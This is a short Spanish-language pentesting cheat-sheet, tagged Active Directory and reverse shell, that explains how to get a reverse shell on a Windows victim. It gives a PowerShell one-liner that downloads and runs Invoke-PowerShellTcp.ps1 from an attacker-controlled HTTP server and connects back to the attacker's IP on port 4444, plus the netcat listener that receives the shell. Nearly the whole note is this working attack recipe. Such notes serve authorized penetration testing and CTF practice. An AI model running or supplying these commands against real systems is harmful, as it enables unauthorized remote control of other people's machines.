# Revershell 

Tags: #AD #ReverseShell 

## Hacer una Revershell 

```powershell 
Paso 1:
- Ejecutar 'hfs (HTTP File Server)' para compartir archivos en Windows 

Paso 2:
❯ powershell iex (iwr -UseBasicParsing http://IP/Invoke-PowerShellTcp.ps1);power -Reverse -IPAddress IP_Atacante -Port 4444 
# Ejecutar la revershell en el server víctima 

Paso 3:
❯ .\nc64.exe -lvp 4444
# En otra terminal ejecutar Netcat para recibir la revershell 
```